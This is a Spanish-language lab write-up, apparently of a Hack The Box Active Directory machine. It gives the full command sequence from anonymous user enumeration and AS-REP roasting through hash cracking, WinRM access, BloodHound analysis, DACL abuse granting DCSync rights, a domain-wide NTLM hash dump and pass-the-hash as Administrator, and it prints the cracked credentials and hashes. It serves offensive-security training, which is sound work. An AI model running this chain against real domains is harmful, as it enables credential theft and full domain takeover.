Con puertos como el 88 (Kerberos), 389 (LDAP) y 445 (SMB) abiertos, es evidente que la máquina es un controlador de dominio de Active Directory.

ENUMERACIÓN — Null session y lista de usuarios

Se prueba a listar recursos mediante null session con nxc.

comprobación de null session
nxc smb 10.129.50.105 -u '' -p '' nxc smb 10.129.50.105 -u '' -p '' --shares
Null session activa, pero sin listado de shares
La autenticación anónima funciona (Null Auth:True), pero al intentar listar shares se recibe STATUS_ACCESS_DENIED. Se prueba entonces a enumerar usuarios de otra forma, con enum4linux.

Con enum4linux se consigue extraer el listado completo de usuarios del dominio vía RID cycling.

enumeración de usuarios
user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] ... user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480]

Con estos nombres se construye un fichero users.txt con los usuarios "reales" (sin las cuentas de sistema/buzones de correo) para intentar un ataque de AS-REP Roasting.

users.txt
Administrator Guest krbtgt sebastien lucinda svc-alfresco andy mark santi
// 03

AS-REP ROASTING — Usuario sin preautenticación

Con la lista de usuarios generada, se lanza un ataque de AS-REP Roasting usando impacket contra el dominio.

as-rep roasting
impacket-GetNPUsers 'htb.local/' -usersfile users.txt -no-pass -dc-ip 10.129.50.105 -format hashcat -outputfile hashes.txt
Usuario vulnerable a AS-REP Roasting
El usuario svc-alfresco tiene desactivada la preautenticación Kerberos (UF_DONT_REQUIRE_PREAUTH), lo que permite obtener su hash $krb5asrep$23$... sin necesidad de credenciales previas.

Se crackea el hash obtenido con hashcat contra el diccionario rockyou.txt.

crackeo del hash AS-REP
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
Contraseña crackeada
La contraseña del usuario svc-alfresco es s3rvice.
// 04

ACCESO INICIAL — Shell como svc-alfresco

Como el puerto 5985 (WinRM) está abierto, se prueba a conectar con evil-winrm usando las credenciales obtenidas.

acceso WinRM
evil-winrm -i 10.129.50.105 -u 'svc-alfresco' -p 's3rvice'

La conexión es exitosa y se obtiene una shell como svc-alfresco.

USER FLAG b5f3ee82bc655067888f99d50d42f323
// 05

BLOODHOUND — Mapeo de permisos en el dominio

Con una cuenta de dominio válida, se recopila información con bloodhound-python para mapear las relaciones y permisos dentro del Active Directory.

recolección de datos con bloodhound
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d 'htb.local' -ns 10.129.50.105 -c all --zip

Se sube el .zip generado a la interfaz de BloodHound y se analiza el camino de Shortest paths to Domain Admins.

Cadena de abuso hacia Domain Admin
1. El usuario svc-alfresco, mediante la cadena de grupos a la que pertenece, forma parte de ACCOUNT OPERATORS, que tiene permiso GenericAll sobre el grupo EXCHANGE WINDOWS PERMISSIONS — se puede añadir a ese grupo.

2. El grupo EXCHANGE WINDOWS PERMISSIONS tiene permiso WriteDacl sobre el objeto del dominio, lo que permite modificar su DACL y concederse a sí mismo los permisos de replicación (DCSync) para volcar los hashes NTLM de todos los usuarios, incluido Administrator.
// 06

DCSYNC — Abuso de GenericAll, WriteDacl y volcado de hashes

Primero se abusa del permiso GenericAll para añadir a svc-alfresco al grupo Exchange Windows Permissions.

añadir usuario al grupo
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.50.105
comprobación de membresía
net rpc group members "Exchange Windows Permissions" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.50.105 HTB\Exchange Trusted Subsystem HTB\svc-alfresco

Con la membresía confirmada, se abusa del permiso WriteDacl heredado para concederse a sí mismo derechos de replicación (DCSync) sobre el objeto del dominio con impacket-dacledit.

concesión de permisos dcsync
impacket-dacledit -action write -rights DCSync -principal svc-alfresco -target-dn "DC=htb,DC=local" "htb.local"/"svc-alfresco":"s3rvice" -dc-ip 10.129.50.105
¿Qué es un ataque DCSync?
DCSync abusa del protocolo de replicación de directorio (MS-DRSR) que usan los controladores de dominio entre sí para sincronizar datos. Cualquier cuenta con los permisos GetChanges y GetChangesAll puede solicitar a un DC que le "replique" las credenciales de cualquier usuario del dominio, incluido el Administrador, sin necesidad de ejecutar código en el propio DC.

Con los permisos de replicación concedidos, se lanza impacket-secretsdump para volcar todos los hashes NTLM del dominio.

ataque dcsync
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.50.105 -just-dc
Hash NTLM del Administrador
Entre los hashes volcados se encuentra el del usuario Administrator: 32693b11e6aa90eb43d32c72a07ceea6.

Con el hash del Administrador se realiza un ataque Pass-The-Hash para autenticarse sin necesidad de conocer la contraseña en texto claro.

pass-the-hash con evil-winrm
evil-winrm -i 10.129.50.105 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

La conexión se establece correctamente con privilegios de Administrador del dominio.
